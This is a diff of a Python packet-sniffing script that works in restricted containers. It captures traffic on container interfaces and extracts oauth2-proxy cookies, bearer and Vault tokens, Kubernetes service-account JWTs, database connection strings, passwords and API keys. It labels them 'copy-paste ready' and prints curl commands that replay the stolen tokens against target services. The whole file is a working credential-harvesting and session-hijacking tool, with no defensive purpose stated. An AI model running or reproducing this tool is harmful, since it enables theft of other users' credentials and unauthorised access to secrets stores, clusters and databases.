@@ -1,238 +1,184 @@
 #!/usr/bin/env python3
 """
-sniff_raw.py
-Logs ALL traffic in raw form — copy-paste ready for reuse.
-Every token/cookie is printed exactly as it appears on the wire.
-
-Usage:
-  python3 sniff_raw.py                  # all interfaces, all traffic
-  python3 sniff_raw.py -i lo            # loopback only
-  python3 sniff_raw.py -i eth0 -p 10443 # specific port
-  python3 sniff_raw.py --raw-only       # skip parsed summary
+sniff_raw.py — works in restricted containers
+Tries multiple socket methods until one works.
 """
-
-import socket, struct, re, os, sys, argparse
+import socket, struct, re, os, sys, argparse, time
 from datetime import datetime
 
-# ── Args ──────────────────────────────────────────────────
 parser = argparse.ArgumentParser()
 parser.add_argument("-i", "--interface", default="any")
 parser.add_argument("-p", "--port", type=int, default=None)
 parser.add_argument("-o", "--output", default=None)
-parser.add_argument("--raw-only", action="store_true",
-                    help="Skip parsed summary lines")
 args = parser.parse_args()
 
 INTERFACES  = (["lo", "eth0", "tunl0"]
                if args.interface == "any"
                else [args.interface])
 FILTER_PORT = args.port
-RAW_ONLY    = args.raw_only
 OUTFILE     = args.output or \
     f"sniff_raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
 PORT_LABELS = {
-    10443: "Jupyter-TLS",   8080: "VSCode/API",
-    8081:  "Jupyter",       8200: "Vault",
-    8443:  "oauth2-proxy",  443:  "HTTPS",
-    5432:  "PostgreSQL",    27017:"MongoDB",
-    6379:  "Redis",         9090: "Prometheus",
-    6443:  "k8s-API",       2379: "etcd",
-    53:    "DNS",           9000: "MinIO",
-    80:    "HTTP",          8888: "Jupyter-int",
-    10250: "Kubelet",       8200: "Vault",
+    10443:"Jupyter-TLS", 8080:"VSCode/API",
+    8081:"Jupyter",      8200:"Vault",
+    8443:"oauth2-proxy", 443:"HTTPS",
+    5432:"PostgreSQL",   27017:"MongoDB",
+    6379:"Redis",        9090:"Prometheus",
+    6443:"k8s-API",      2379:"etcd",
+    53:"DNS",            9000:"MinIO",
+    80:"HTTP",           8888:"Jupyter-int",
+    10250:"Kubelet",
 }
 
-# Things to highlight (but always print raw)
 HIGHLIGHT_PATTERNS = {
-    "OAUTH2_COOKIE":    r'_oauth2_proxy=[^\s\r\n;,]+',
-    "BEARER_TOKEN":     r'(?i)authorization:\s*bearer\s+[^\s\r\n]+',
-    "TOKEN_HEADER":     r'(?i)authorization:\s*token\s+[^\s\r\n]+',
-    "VAULT_TOKEN":      r'(?i)x-vault-token:\s*[^\s\r\n]+',
-    "VAULT_TOKEN_VAL":  r'\bs\.[A-Za-z0-9]{24,}\b',
-    "COOKIE_HEADER":    r'(?i)^cookie:\s*.+',
-    "SET_COOKIE":       r'(?i)^set-cookie:\s*.+',
-    "KEYCLOAK_TOKEN":   r'"access_token"\s*:\s*"[^"]+"',
-    "REFRESH_TOKEN":    r'"refresh_token"\s*:\s*"[^"]+"',
-    "SA_JWT":           r'eyJ[A-Za-z0-9\-_]+\.'
-                        r'[A-Za-z0-9\-_]+\.'
-                        r'[A-Za-z0-9\-_]+',
-    "S3_AUTH":          r'(?i)x-amz-[^\s\r\n:]+:\s*[^\s\r\n]+',
-    "S3_CRED_URL":      r'(?i)aws[_-]?(?:access[_-]?key|'
-                        r'secret)[^\s\r\n=]*=[^\s\r\n&]+',
-    "DB_CONN_STR":      r'(?i)(?:postgresql|mongodb|redis)'
-                        r'://[^\s\r\n"\']+',
-    "PASSWORD_FIELD":   r'(?i)password[=:\s"]+[^\s"&\r\n]{4,}',
-    "API_KEY":          r'(?i)(?:api[_-]?key|x-api-key)'
-                        r'[=:\s"]+[^\s"&\r\n]{8,}',
+    "OAUTH2_COOKIE":  r'_oauth2_proxy=[^\s\r\n;,]+',
+    "BEARER_TOKEN":   r'(?i)authorization:\s*bearer\s+[^\s\r\n]+',
+    "TOKEN_HEADER":   r'(?i)authorization:\s*token\s+[^\s\r\n]+',
+    "VAULT_TOKEN":    r'(?i)x-vault-token:\s*[^\s\r\n]+',
+    "VAULT_TOKEN_S":  r'\bs\.[A-Za-z0-9]{24,}\b',
+    "COOKIE_HEADER":  r'(?i)^cookie:\s*.+',
+    "SET_COOKIE":     r'(?i)^set-cookie:\s*.+',
+    "ACCESS_TOKEN":   r'"access_token"\s*:\s*"[^"]+"',
+    "REFRESH_TOKEN":  r'"refresh_token"\s*:\s*"[^"]+"',
+    "SA_JWT":         r'eyJ[A-Za-z0-9\-_]{10,}\.'
+                      r'[A-Za-z0-9\-_]{10,}\.'
+                      r'[A-Za-z0-9\-_]{10,}',
+    "S3_AUTH":        r'(?i)x-amz-[^\s\r\n:]+:\s*[^\s\r\n]+',
+    "DB_CONN":        r'(?i)(?:postgresql|mongodb|redis)'
+                      r'://[^\s\r\n"\'<>]+',
+    "PASSWORD":       r'(?i)password["\s:=]+[^\s"&\r\n,]{4,}',
+    "API_KEY":        r'(?i)(?:api[_-]?key|x-api-key)'
+                      r'[\s:="]+[^\s"&\r\n]{8,}',
 }
 
-stats = {"total": 0, "tcp": 0, "udp": 0,
-         "logged": 0, "highlights": 0}
+stats = {
+    "total":0, "tcp":0, "udp":0,
+    "logged":0, "highlights":0
+}
 
 # ── Writer ────────────────────────────────────────────────
 
-def w(f, line):
-    """Write line with timestamp to file and stdout"""
-    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
-    out  = f"[{ts}] {line}"
+def w(f, line, ts=True):
+    if ts:
+        t   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+        out = f"[{t}] {line}"
+    else:
+        out = line
     print(out)
     f.write(out + "\n")
     f.flush()
 
-def w_raw(f, line):
-    """Write line WITHOUT timestamp — for raw copy-paste blocks"""
-    print(line)
-    f.write(line + "\n")
-    f.flush()
-
-# ── Payload formatter ─────────────────────────────────────
+# ── Payload display ───────────────────────────────────────
 
 def show_payload(f, payload):
-    """
-    Show payload three ways:
-      1. Raw text — exactly as on the wire
-      2. Highlighted lines — auth/token lines flagged
-      3. Extracted values — copy-paste ready
-    """
     if not payload:
         return
 
-    # ── 1. Raw text block ─────────────────────────────────
-    w_raw(f, "    ┌─── RAW PAYLOAD ──────────────────────────────")
+    # Raw text
+    w(f, "    ┌─── RAW PAYLOAD ─────────────────────────",
+      ts=False)
     try:
         text = payload.decode("utf-8", errors="replace")
         for line in text.splitlines():
-            w_raw(f, f"    │ {line}")
+            w(f, f"    │ {line}", ts=False)
     except:
-        # Binary — show hex
-        hex_lines = []
-        for i in range(0, min(len(payload), 512), 16):
+        for i in range(0, min(len(payload), 256), 16):
             chunk   = payload[i:i+16]
             hex_str = ' '.join(f'{b:02x}' for b in chunk)
             asc_str = ''.join(
                 chr(b) if 32 <= b < 127 else '.'
                 for b in chunk
             )
-            hex_lines.append(
-                f"    │ {i:04x}  {hex_str:<48}  {asc_str}"
-            )
-        for line in hex_lines:
-            w_raw(f, line)
-    w_raw(f, "    └─────────────────────────────────────────────")
+            w(f, f"    │ {i:04x}  {hex_str:<48}  {asc_str}",
+              ts=False)
+    w(f, "    └─────────────────────────────────────────",
+      ts=False)
 
-    # ── 2 & 3. Highlights + extracted values ──────────────
+    # Extract highlights
     try:
         text = payload.decode("utf-8", errors="replace")
     except:
         return
 
-    found_highlights = []
+    hits = []
     for label, pattern in HIGHLIGHT_PATTERNS.items():
-        matches = re.findall(pattern, text,
-                             re.MULTILINE | re.IGNORECASE)
-        for match in matches:
-            found_highlights.append((label, match))
+        for match in re.findall(pattern, text,
+                                re.MULTILINE|re.IGNORECASE):
+            hits.append((label, match))
             stats["highlights"] += 1
 
-    if found_highlights:
-        w_raw(f, "")
-        w_raw(f, "    ╔══ EXTRACTED VALUES "
-                 "(copy-paste ready) ══════════")
-        for label, value in found_highlights:
-            w_raw(f, f"    ║ [{label}]")
-            w_raw(f, f"    ║   {value}")
-            w_raw(f, f"    ║")
-
-            # Extra: for JWT tokens decode the payload
-            if label == "SA_JWT":
-                try:
-                    import base64, json
-                    parts = value.split('.')
-                    if len(parts) >= 2:
-                        pad = parts[1] + \
-                              '=' * (4 - len(parts[1]) % 4)
-                        decoded = json.loads(
-                            base64.b64decode(pad)
-                        )
-                        w_raw(f, f"    ║   JWT PAYLOAD: "
-                                 f"{json.dumps(decoded)[:200]}")
-                        w_raw(f, f"    ║")
-                except:
-                    pass
-
-            # Extra: show how to use the token
-            if label == "OAUTH2_COOKIE":
-                cookie_val = re.search(
-                    r'_oauth2_proxy=([^\s\r\n;,]+)',
-                    value
-                )
-                if cookie_val:
-                    val = cookie_val.group(1)
-                    w_raw(f, f"    ║   USE: curl -k "
-                             f"-H 'Cookie: _oauth2_proxy="
-                             f"{val}' "
-                             f"https://TARGET:10443/PREFIX/api")
-                    w_raw(f, f"    ║")
-                    w_raw(f, f"    ║   OR in Python:")
-                    w_raw(f, f"    ║   requests.get(url, "
-                             f"headers={{'Cookie': "
-                             f"'_oauth2_proxy={val[:40]}...'"
-                             f"}})")
-                    w_raw(f, f"    ║")
-
-            if label == "BEARER_TOKEN":
-                token_val = re.search(
-                    r'(?i)authorization:\s*bearer\s+'
-                    r'([^\s\r\n]+)',
-                    value
-                )
-                if token_val:
-                    val = token_val.group(1)
-                    w_raw(f, f"    ║   USE: curl -k "
-                             f"-H 'Authorization: Bearer "
-                             f"{val}' "
-                             f"https://TARGET/endpoint")
-                    w_raw(f, f"    ║")
-
-            if label == "VAULT_TOKEN":
-                token_val = re.search(
-                    r'(?i)x-vault-token:\s*([^\s\r\n]+)',
-                    value
-                )
-                if token_val:
-                    val = token_val.group(1)
-                    w_raw(f, f"    ║   USE: curl -k "
-                             f"-H 'X-Vault-Token: {val}' "
-                             f"$VAULT/v1/secret/")
-                    w_raw(f, f"    ║   OR:  curl -k "
-                             f"-H 'X-Vault-Token: {val}' "
-                             f"$VAULT/v1/auth/token/"
-                             f"lookup-self")
-                    w_raw(f, f"    ║")
-
-        w_raw(f, "    ╚══════════════════════════════════════════")
-
-
-# ── Packet handler ────────────────────────────────────────
-
-def handle(raw, iface, f):
-    stats["total"] += 1
-
-    if len(raw) < 14:
+    if not hits:
         return
 
-    eth_type = struct.unpack("!H", raw[12:14])[0]
-    if eth_type == 0x0800:
-        ip_data = raw[14:]
-    elif eth_type not in [0x0800, 0x86DD]:
-        ip_data = raw
-    else:
-        return
+    w(f, "", ts=False)
+    w(f, "    ╔══ EXTRACTED (copy-paste ready) ══════════",
+      ts=False)
+    for label, value in hits:
+        w(f, f"    ║ [{label}]", ts=False)
+        w(f, f"    ║   {value}", ts=False)
 
+        # Usage hints
+        if "OAUTH2" in label:
+            m = re.search(r'_oauth2_proxy=([^\s;,\r\n]+)',
+                          value)
+            if m:
+                v = m.group(1)
+                w(f, f"    ║   → curl -k "
+                     f"-H 'Cookie: _oauth2_proxy={v}' "
+                     f"https://TARGET:10443/PREFIX/api",
+                  ts=False)
+                w(f, f"    ║   → requests.get(url, "
+                     f"headers={{'Cookie':"
+                     f"'_oauth2_proxy={v[:30]}...'}})",
+                  ts=False)
+
+        elif "BEARER" in label or "TOKEN_HEADER" in label:
+            m = re.search(r'(?i)(?:bearer|token)\s+'
+                          r'([^\s\r\n]+)', value)
+            if m:
+                v = m.group(1)
+                w(f, f"    ║   → curl -k "
+                     f"-H 'Authorization: Bearer {v}' "
+                     f"https://TARGET/api",
+                  ts=False)
+
+        elif "VAULT" in label:
+            m = re.search(r'(?i)(?:x-vault-token:\s*|'
+                          r'\bs\.)([^\s\r\n]+)', value)
+            if m:
+                v = m.group(0)
+                w(f, f"    ║   → curl -k "
+                     f"-H 'X-Vault-Token: {v}' "
+                     f"$VAULT/v1/auth/token/lookup-self",
+                  ts=False)
+
+        elif "SA_JWT" in label:
+            try:
+                import base64, json
+                parts = value.split('.')
+                pad   = parts[1] + \
+                        '=' * (4-len(parts[1]) % 4)
+                pl    = json.loads(base64.b64decode(pad))
+                ns    = pl.get('kubernetes.io',{})\
+                          .get('namespace','?')
+                sa    = pl.get('kubernetes.io',{})\
+                          .get('serviceaccount',{})\
+                          .get('name','?')
+                w(f, f"    ║   → k8s SA: {ns}/{sa}",
+                  ts=False)
+            except:
+                pass
+
+        w(f, "    ║", ts=False)
+    w(f, "    ╚═══════════════════════════════════════════",
+      ts=False)
+
+# ── Packet processing ─────────────────────────────────────
+
+def process_ip(ip_data, iface, f):
     if len(ip_data) < 20:
         return
-
     iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
     proto = iph[6]
     src   = socket.inet_ntoa(iph[8])
@@ -240,15 +186,12 @@ def handle(raw, iface, f):
     ihl   = (iph[0] & 0xF) * 4
     rest  = ip_data[ihl:]
 
-    # ── TCP ───────────────────────────────────────────────
-    if proto == 6:
-        if len(rest) < 20:
-            return
-        tcph   = struct.unpack("!HHLLBBHHH", rest[:20])
-        sport  = tcph[0]
-        dport  = tcph[1]
-        flags  = tcph[5]
-        offset = (tcph[4] >> 4) * 4
+    if proto == 6 and len(rest) >= 20:      # TCP
+        tcph    = struct.unpack("!HHLLBBHHH", rest[:20])
+        sport   = tcph[0]
+        dport   = tcph[1]
+        flags   = tcph[5]
+        offset  = (tcph[4] >> 4) * 4
         payload = rest[offset:]
 
         if FILTER_PORT and \
@@ -256,25 +199,21 @@ def handle(raw, iface, f):
            dport != FILTER_PORT:
             return
 
-        flag_str = "".join([
+        fs  = "".join([
             "S" if flags & 0x02 else "",
             "A" if flags & 0x10 else "",
             "F" if flags & 0x01 else "",
             "R" if flags & 0x04 else "",
             "P" if flags & 0x08 else "",
         ]) or "."
+        sl  = f"{sport}[{PORT_LABELS[sport]}]" \
+              if sport in PORT_LABELS else str(sport)
+        dl  = f"{dport}[{PORT_LABELS[dport]}]" \
+              if dport in PORT_LABELS else str(dport)
 
-        sl = f"{sport}"
-        dl = f"{dport}"
-        if sport in PORT_LABELS:
-            sl = f"{sport}[{PORT_LABELS[sport]}]"
-        if dport in PORT_LABELS:
-            dl = f"{dport}[{PORT_LABELS[dport]}]"
-
-        w(f, f"═══ TCP {iface} "
+        w(f, f"TCP {iface} "
              f"{src}:{sl} → {dst}:{dl} "
-             f"flags={flag_str} "
-             f"payload={len(payload)}b")
+             f"flags={fs} len={len(payload)}b")
 
         if payload:
             show_payload(f, payload)
@@ -282,12 +221,9 @@ def handle(raw, iface, f):
         stats["tcp"]    += 1
         stats["logged"] += 1
 
-    # ── UDP ───────────────────────────────────────────────
-    elif proto == 17:
-        if len(rest) < 8:
-            return
-        sport = struct.unpack("!H", rest[:2])[0]
-        dport = struct.unpack("!H", rest[2:4])[0]
+    elif proto == 17 and len(rest) >= 8:    # UDP
+        sport   = struct.unpack("!H", rest[:2])[0]
+        dport   = struct.unpack("!H", rest[2:4])[0]
         payload = rest[8:]
 
         if FILTER_PORT and \
@@ -300,28 +236,148 @@ def handle(raw, iface, f):
         dl = f"{dport}[{PORT_LABELS[dport]}]" \
              if dport in PORT_LABELS else str(dport)
 
-        w(f, f"─── UDP {iface} "
+        w(f, f"UDP {iface} "
              f"{src}:{sl} → {dst}:{dl} "
-             f"payload={len(payload)}b")
-
+             f"len={len(payload)}b")
         if payload:
             show_payload(f, payload)
 
         stats["udp"]    += 1
         stats["logged"] += 1
 
-    # ── ICMP ──────────────────────────────────────────────
-    elif proto == 1 and len(rest) >= 2:
-        w(f, f"--- ICMP {iface} "
-             f"{src} → {dst} "
+    elif proto == 1 and len(rest) >= 2:     # ICMP
+        w(f, f"ICMP {iface} {src} → {dst} "
              f"type={rest[0]} code={rest[1]}")
         stats["logged"] += 1
 
+# ── Socket methods — try each until one works ─────────────
+
+def try_af_packet(iface):
+    """Method 1: AF_PACKET (needs CAP_NET_RAW)"""
+    s = socket.socket(
+        socket.AF_PACKET,
+        socket.SOCK_RAW,
+        socket.htons(0x0003)
+    )
+    s.bind((iface, 0))
+    s.settimeout(0.05)
+    return s, "AF_PACKET"
+
+def try_raw_ip(proto=socket.IPPROTO_TCP):
+    """Method 2: Raw IP socket (needs root)"""
+    s = socket.socket(
+        socket.AF_INET,
+        socket.SOCK_RAW,
+        proto
+    )
+    s.setsockopt(socket.IPPROTO_IP,
+                 socket.IP_HDRINCL, 1)
+    s.settimeout(0.05)
+    return s, "RAW_IP"
+
+def try_raw_all():
+    """Method 3: Raw socket all protocols"""
+    s = socket.socket(
+        socket.AF_INET,
+        socket.SOCK_RAW,
+        socket.IPPROTO_RAW
+    )
+    s.settimeout(0.05)
+    return s, "RAW_ALL"
+
+def sniff_af_packet(sock, iface, f):
+    """Receive loop for AF_PACKET"""
+    raw, _ = sock.recvfrom(65535)
+    stats["total"] += 1
+
+    if len(raw) < 14:
+        return
+    eth_type = struct.unpack("!H", raw[12:14])[0]
+    if eth_type == 0x0800:
+        process_ip(raw[14:], iface, f)
+    elif eth_type not in [0x0800, 0x86DD]:
+        # No ethernet header (loopback on some systems)
+        process_ip(raw, iface, f)
+
+def sniff_raw_ip(sock, iface, f):
+    """Receive loop for raw IP socket"""
+    raw, addr = sock.recvfrom(65535)
+    stats["total"] += 1
+    process_ip(raw, iface, f)
+
+# ── Fallback: /proc/net TCP state reader ──────────────────
+
+def proc_net_fallback(f):
+    """
+    Last resort: read /proc/net/tcp for connection state.
+    No packet capture, but shows all TCP connections
+    and can be polled to detect new connections.
+    """
+    w(f, "Using /proc/net/tcp fallback "
+         "(connection state only, no payload)")
+
+    seen = set()
+    while True:
+        try:
+            with open("/proc/net/tcp") as fh:
+                lines = fh.readlines()[1:]  # skip header
+            with open("/proc/net/tcp6") as fh:
+                lines += fh.readlines()[1:]
+        except:
+            time.sleep(1)
+            continue
+
+        for line in lines:
+            parts = line.split()
+            if len(parts) < 4:
+                continue
+            local  = parts[1]
+            remote = parts[2]
+            state  = parts[3]
+
+            # Decode hex address:port
+            def decode_addr(hex_str):
+                addr, port = hex_str.split(':')
+                # IPv4 in little-endian
+                ip = '.'.join(str(int(addr[i:i+2], 16))
+                              for i in [6,4,2,0])
+                port_n = int(port, 16)
+                return ip, port_n
+
+            try:
+                local_ip,  local_port  = decode_addr(local)
+                remote_ip, remote_port = decode_addr(remote)
+            except:
+                continue
+
+            key = f"{local_ip}:{local_port}-" \
+                  f"{remote_ip}:{remote_port}-{state}"
+
+            if key not in seen:
+                seen.add(key)
+                state_names = {
+                    "01":"ESTABLISHED", "02":"SYN_SENT",
+                    "03":"SYN_RECV",    "04":"FIN_WAIT1",
+                    "0A":"LISTEN",      "06":"TIME_WAIT",
+                }
+                sname = state_names.get(
+                    state.upper(), state
+                )
+                lp = PORT_LABELS.get(local_port, local_port)
+                rp = PORT_LABELS.get(remote_port, remote_port)
+
+                if FILTER_PORT is None or \
+                   local_port == FILTER_PORT or \
+                   remote_port == FILTER_PORT:
+                    w(f, f"CONN {local_ip}:{lp} ↔ "
+                         f"{remote_ip}:{rp} [{sname}]")
+
+        time.sleep(0.5)
 
 # ── Main ──────────────────────────────────────────────────
 
 def main():
-    print(f"sniff_raw.py — Full raw capture")
+    print(f"sniff_raw.py")
     print(f"  Interfaces : {INTERFACES}")
     print(f"  Port filter: {FILTER_PORT or 'ALL'}")
     print(f"  Output     : {OUTFILE}\n")
@@ -333,66 +389,94 @@ def main():
             "--", sys.executable
         ] + sys.argv)
 
-    # Open sockets
-    socks = {}
-    for iface in INTERFACES:
-        try:
-            s = socket.socket(
-                socket.AF_PACKET,
-                socket.SOCK_RAW,
-                socket.htons(0x0003)
-            )
-            s.bind((iface, 0))
-            s.settimeout(0.05)
-            socks[iface] = s
-            print(f"  ✓ {iface}")
-        except Exception as e:
-            print(f"  ✗ {iface}: {e}")
-
-    if not socks:
-        print("No interfaces available!")
-        sys.exit(1)
-
     with open(OUTFILE, "w", buffering=1) as f:
         w(f, f"CAPTURE START {datetime.now()}")
-        w(f, f"Interfaces: {list(socks.keys())}")
+        w(f, f"Interface: {INTERFACES}")
         w(f, f"Port: {FILTER_PORT or 'ALL'}")
         w(f, "═" * 70)
 
+        # ── Try socket methods in order ───────────────────
+        socks   = {}   # iface → (sock, method, recv_fn)
+        working = None
+
+        # Method 1: AF_PACKET per interface
+        for iface in INTERFACES:
+            try:
+                sock, method = try_af_packet(iface)
+                socks[iface] = (sock, method, sniff_af_packet)
+                w(f, f"✓ {iface}: {method}")
+                working = True
+            except Exception as e:
+                w(f, f"✗ {iface} AF_PACKET: {e}")
+
+        # Method 2: Single raw IP socket (all traffic)
+        if not socks:
+            for proto in [socket.IPPROTO_TCP,
+                          socket.IPPROTO_UDP,
+                          socket.IPPROTO_RAW]:
+                try:
+                    sock, method = try_raw_ip(proto)
+                    socks["raw"] = (sock, method,
+                                   sniff_raw_ip)
+                    w(f, f"✓ raw socket: {method} "
+                         f"proto={proto}")
+                    working = True
+                    break
+                except Exception as e:
+                    w(f, f"✗ RAW_IP proto={proto}: {e}")
+
+        # Method 3: /proc/net fallback
+        if not socks:
+            w(f, "⚠ No raw sockets available!")
+            w(f, "Falling back to /proc/net/tcp monitor")
+            w(f, "(Shows connections but no payload)")
+            try:
+                proc_net_fallback(f)
+            except KeyboardInterrupt:
+                pass
+            return
+
+        # ── Capture loop ──────────────────────────────────
+        w(f, f"\nCapturing... Ctrl+C to stop\n")
         try:
             while True:
-                for iface, sock in socks.items():
+                for iface, (sock, method, recv_fn) in \
+                        socks.items():
                     try:
-                        raw, _ = sock.recvfrom(65535)
-                        handle(raw, iface, f)
+                        recv_fn(sock, iface, f)
                     except socket.timeout:
                         continue
+                    except OSError as e:
+                        # Network down error — try to reopen
+                        if e.errno in [100, 101, 19]:
+                            w(f, f"⚠ {iface} down, "
+                                 f"skipping...")
+                            time.sleep(1)
+                            continue
+                        raise
 
                 if stats["total"] % 10000 == 0 \
                    and stats["total"] > 0:
                     w(f, f"[STATS] "
-                         f"total={stats['total']} "
+                         f"pkts={stats['total']} "
                          f"tcp={stats['tcp']} "
                          f"udp={stats['udp']} "
-                         f"highlights={stats['highlights']}")
+                         f"hits={stats['highlights']}")
 
         except KeyboardInterrupt:
             pass
 
         w(f, "═" * 70)
         w(f, f"CAPTURE END {datetime.now()}")
-        w(f, f"packets={stats['total']} "
+        w(f, f"pkts={stats['total']} "
              f"logged={stats['logged']} "
              f"highlights={stats['highlights']}")
 
-    print(f"\n[*] Saved to {OUTFILE}")
-
-    # Print summary of all extracted values
-    print("\n" + "=" * 60)
-    print("REUSABLE VALUES EXTRACTED")
-    print("=" * 60)
-    print(f"Check {OUTFILE} and grep for ╔══ EXTRACTED")
-    print(f"Or run: grep -A3 'EXTRACTED' {OUTFILE}")
+    print(f"\n[*] Saved → {OUTFILE}")
+    print(f"[*] Grep for extracted values:")
+    print(f"    grep '║' {OUTFILE}")
+    print(f"    grep 'oauth2_proxy' {OUTFILE}")
+    print(f"    grep 'BEARER' {OUTFILE}")
 
 
 if __name__ == "__main__":
